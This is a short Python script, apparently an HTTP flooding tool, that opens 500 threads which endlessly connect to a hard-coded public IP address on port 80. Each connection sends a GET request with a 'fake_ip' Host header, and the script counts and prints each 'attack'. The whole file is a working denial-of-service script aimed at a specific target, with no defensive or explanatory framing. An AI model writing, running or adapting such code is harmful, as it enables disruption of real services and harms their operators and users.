import socket
import threading

target = '50.18.142.31'
fake_ip = '192.168.0.104'
port = 80
attack_num = 0  # Initialize attack_num variable

def attack():
    global attack_num  # Declare attack_num as global to modify its value
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            attack_num += 1  # Increment attack_num for each successful connection
            print("Attack:", attack_num)
            s.close()
        except Exception as e:
            print("Error:", e)  # Print any exceptions that occur during the attack

# Create threads for the attack
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
